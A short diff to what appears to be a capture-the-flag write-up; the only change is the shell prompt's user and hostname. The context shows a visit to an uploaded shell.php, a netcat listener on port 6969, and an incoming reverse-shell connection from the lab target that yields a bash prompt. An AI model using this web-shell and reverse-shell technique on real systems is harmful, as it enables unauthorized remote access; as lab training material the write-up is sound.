@@ -147,7 +147,7 @@ now open our webbrowser and visit localhost:8888/shell.php. It seem like we can 
 
 dont forget to start netcat and listen to incoming reverse shell
 ```console
-kali@kali:~$ nc -nlvp 6969
+bibo318@parrot:~$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.54.196] 39836
 bash: cannot set terminal process group (948): Inappropriate ioctl for device
